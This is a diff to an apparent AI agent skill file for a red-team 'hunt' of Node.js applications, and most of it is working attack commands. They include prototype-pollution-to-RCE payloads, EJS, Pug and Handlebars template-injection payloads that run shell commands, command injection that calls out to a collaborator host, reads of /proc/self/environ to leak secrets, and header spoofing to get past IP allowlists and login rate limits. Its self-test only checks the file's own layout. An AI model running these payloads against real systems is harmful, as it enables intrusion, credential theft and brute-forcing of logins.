@@ -1,8 +1,11 @@
 ---
 name: hunt-nodejs
 description: Hunt Node.js specific vulnerabilities — Prototype Pollution → RCE chains (lodash/merge/assign), Express trust proxy misconfiguration, child_process/eval injection, template engine SSTI (EJS/Pug/Handlebars), path traversal in file servers, require() injection, environment variable exfil via /proc/self/environ. Use when target runs Node.js/Express/Fastify/NestJS/Koa.
-sources: hackerone_public, snyk_research, portswigger_research
-report_count: 24
+version: 1.1.0
+revision_date: 2026-07-25
+license: MIT
+category: redteam
+tags: [nodejs, hunt, redteam, javascript]
 ---
 
 # HUNT-NODEJS — Node.js Specific Vulnerabilities
@@ -37,15 +40,15 @@ __proto__ in JSON accepted        Prototype pollution candidate
 
 ```bash
 # Confirm Node.js/Express
-curl -sI https://$TARGET/ | grep -i "x-powered-by\|nodejs\|express"
+curl --max-time 30 --connect-timeout 10 -sI https://$TARGET/ | grep -i "x-powered-by\|nodejs\|express"
 
 # Check for package.json / node_modules exposure
-curl -s "https://$TARGET/package.json"
-curl -s "https://$TARGET/package-lock.json"
-curl -s "https://$TARGET/node_modules/.package-lock.json"
+curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/package.json"
+curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/package-lock.json"
+curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/node_modules/.package-lock.json"
 
 # Error-based version detection
-curl -s "https://$TARGET/nonexistent-path-xyz" | grep -i "node\|express\|cannot GET"
+curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/nonexistent-path-xyz" | grep -i "node\|express\|cannot GET"
 ```
 
 ---
@@ -54,21 +57,21 @@ curl -s "https://$TARGET/nonexistent-path-xyz" | grep -i "node\|express\|cannot 
 
 ```bash
 # JSON body injection — test if __proto__ is accepted
-curl -s -X POST https://$TARGET/api/merge \
+curl --max-time 30 --connect-timeout 10 -s -X POST https://$TARGET/api/merge \
   -H "Content-Type: application/json" \
   -d '{"__proto__": {"polluted": "yes"}}'
 
 # Constructor prototype
-curl -s -X POST https://$TARGET/api/settings \
+curl --max-time 30 --connect-timeout 10 -s -X POST https://$TARGET/api/settings \
   -H "Content-Type: application/json" \
   -d '{"constructor": {"prototype": {"isAdmin": true}}}'
 
 # URL query param injection (qs library)
-curl -s "https://$TARGET/api/search?__proto__[polluted]=yes&query=test"
-curl -s "https://$TARGET/api/data?constructor[prototype][admin]=1"
+curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/api/search?__proto__[polluted]=yes&query=test"
+curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/api/data?constructor[prototype][admin]=1"
 
 # Confirm pollution: does a subsequent request reflect the polluted key?
-curl -s "https://$TARGET/api/me" | grep -i "polluted\|isAdmin\|admin"
+curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/api/me" | grep -i "polluted\|isAdmin\|admin"
 ```
 
 ---
@@ -79,7 +82,7 @@ curl -s "https://$TARGET/api/me" | grep -i "polluted\|isAdmin\|admin"
 # If pollution is confirmed, attempt to reach dangerous sinks
 
 # Sink 1: child_process via options.shell pollution
-curl -s -X POST https://$TARGET/api/update \
+curl --max-time 30 --connect-timeout 10 -s -X POST https://$TARGET/api/update \
   -H "Content-Type: application/json" \
   -d '{
     "__proto__": {
@@ -90,13 +93,13 @@ curl -s -X POST https://$TARGET/api/update \
   }'
 
 # Sink 2: lodash template pollution (CVE-2021-23337)
-curl -s -X POST https://$TARGET/api/render \
+curl --max-time 30 --connect-timeout 10 -s -X POST https://$TARGET/api/render \
   -H "Content-Type: application/json" \
   -d '{"__proto__": {"sourceURL": "\nreturn process.mainModule.require(\"child_process\").execSync(\"id\").toString()//"}}'
 
 # Sink 3: ejs template options pollution
 # If EJS is used for rendering, pollute the `opts.escapeXML` or `opts.outputFunctionName`
-curl -s -X POST https://$TARGET/api/template \
+curl --max-time 30 --connect-timeout 10 -s -X POST https://$TARGET/api/template \
   -H "Content-Type: application/json" \
   -d '{"__proto__": {"outputFunctionName": "x;process.mainModule.require(\"child_process\").execSync(\"curl COLLAB_HOST/pp-rce\");x"}}'
 
@@ -112,19 +115,19 @@ curl -s -X POST https://$TARGET/api/template \
 # Test: does spoofed IP bypass IP-based rate limiting or allowlist?
 
 # Spoof IP to 127.0.0.1 (localhost bypass)
-curl -s -X POST https://$TARGET/api/admin/action \
+curl --max-time 30 --connect-timeout 10 -s -X POST https://$TARGET/api/admin/action \
   -H "X-Forwarded-For: 127.0.0.1" \
   -H "Content-Type: application/json" \
   -d '{"action": "test"}'
 
 # Spoof to internal IP range
-curl -s -X POST https://$TARGET/api/internal \
+curl --max-time 30 --connect-timeout 10 -s -X POST https://$TARGET/api/internal \
   -H "X-Forwarded-For: 10.0.0.1" \
   -H "X-Real-IP: 10.0.0.1"
 
 # Rate limit bypass via rotating fake IPs
 for i in $(seq 1 50); do
-  curl -s https://$TARGET/api/login \
+  curl --max-time 30 --connect-timeout 10 -s https://$TARGET/api/login \
     -H "X-Forwarded-For: 1.2.3.$i" \
     -d '{"email":"admin@test.com","password":"wrong"}' \
     -o /dev/null -w "$i: %{http_code}\n"
@@ -138,22 +141,22 @@ done
 ```bash
 # EJS SSTI — if user input reaches EJS template context
 # Test basic: <%= 7*7 %> should return 49
-curl -s -X POST https://$TARGET/api/render \
+curl --max-time 30 --connect-timeout 10 -s -X POST https://$TARGET/api/render \
   -H "Content-Type: application/json" \
   -d '{"template": "<%= 7*7 %>"}'
 
 # EJS RCE payload
-curl -s -X POST https://$TARGET/api/render \
+curl --max-time 30 --connect-timeout 10 -s -X POST https://$TARGET/api/render \
   -H "Content-Type: application/json" \
   -d '{"template": "<%= process.mainModule.require(\"child_process\").execSync(\"id\").toString() %>"}'
 
 # Pug SSTI
-curl -s -X POST https://$TARGET/api/render \
+curl --max-time 30 --connect-timeout 10 -s -X POST https://$TARGET/api/render \
   -H "Content-Type: application/json" \
   -d '{"template": "- var x = root.process\n= x.mainModule.require(\"child_process\").execSync(\"id\")"}'
 
 # Handlebars — prototype pollution via template
-curl -s -X POST https://$TARGET/api/render \
+curl --max-time 30 --connect-timeout 10 -s -X POST https://$TARGET/api/render \
   -H "Content-Type: application/json" \
   -d '{"template": "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push \"return process.mainModule.require(childprocess).execSync(id)\"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}"}'
 ```
@@ -167,14 +170,14 @@ curl -s -X POST https://$TARGET/api/render \
 # Signals: /api/convert, /api/exec, /api/ping, /api/scan
 
 # Basic injection test
-curl -s "https://$TARGET/api/ping?host=127.0.0.1;id"
-curl -s "https://$TARGET/api/convert?file=test.pdf;curl+COLLAB_HOST/ci"
-curl -s -X POST https://$TARGET/api/exec \
+curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/api/ping?host=127.0.0.1;id"
+curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/api/convert?file=test.pdf;curl+COLLAB_HOST/ci"
+curl --max-time 30 --connect-timeout 10 -s -X POST https://$TARGET/api/exec \
   -H "Content-Type: application/json" \
   -d '{"command": "ls", "args": ["&&", "curl", "COLLAB_HOST/ci"]}'
 
 # OOB via DNS
-curl -s "https://$TARGET/api/dns?host=\$(curl+COLLAB_HOST/dns-ci).example.com"
+curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/api/dns?host=\$(curl+COLLAB_HOST/dns-ci).example.com"
 ```
 
 ---
@@ -183,12 +186,12 @@ curl -s "https://$TARGET/api/dns?host=\$(curl+COLLAB_HOST/dns-ci).example.com"
 
 ```bash
 # If LFI exists on Node.js app, /proc/self/environ leaks env vars
-curl -s "https://$TARGET/api/file?path=/proc/self/environ"
-curl -s "https://$TARGET/api/read?file=../../../../proc/self/environ"
+curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/api/file?path=/proc/self/environ"
+curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/api/read?file=../../../../proc/self/environ"
 
 # Also check:
-curl -s "https://$TARGET/api/file?path=/proc/self/cmdline"  # full command line
-curl -s "https://$TARGET/api/file?path=/proc/self/cwd"       # working directory
+curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/api/file?path=/proc/self/cmdline"  # full command line
+curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/api/file?path=/proc/self/cwd"       # working directory
 ```
 
 ---
@@ -217,6 +220,38 @@ curl -s "https://$TARGET/api/file?path=/proc/self/cwd"       # working directory
 - child_process injection: Critical
 - Trust proxy → rate limit bypass: Medium
 - /proc/self/environ exfil: High (if cloud keys present)
+
+## Verification
+
+Run this self-test to confirm nodejs hunting readiness:
+
+1. **Skill integrity** — confirm the skill file is readable and well-formed:
+   ```bash
+   grep -q "name: hunt-nodejs" SKILL.md && echo "PASS: skill frontmatter present" || echo "FAIL"
+   grep -q "revision_date:" SKILL.md && echo "PASS: revision date present" || echo "FAIL"
+   ```
+
+2. **Category check** — confirm the skill has a category:
+   ```bash
+   grep -q "category:" SKILL.md && echo "PASS: category present" || echo "FAIL"
+   ```
+
+3. **Pitfalls section** — confirm pitfalls are documented:
+   ```bash
+   grep -q "^## Pitfalls" SKILL.md && echo "PASS: pitfalls section present" || echo "FAIL"
+   ```
+
+All 3 tests verify the skill is properly structured and ready for use.
+
+---
+
+## Pitfalls
+- **Prototype pollution without gadget** — `__proto__` injection is a primitive. Need a gadget chain to RCE, auth bypass, or XSS.
+- **eval with static input** — `eval("'use strict'; ...")` is not exploitable. Need dynamic, user-controllable input.
+- **child_process without user input** — `exec("ls -la")` is not exploitable unless the command includes user input.
+- **Server-Side JavaScript Injection (SSJI)** — different from prototype pollution. Distinguish the two attack classes.
+
+---
 
 ## Related Skills
 
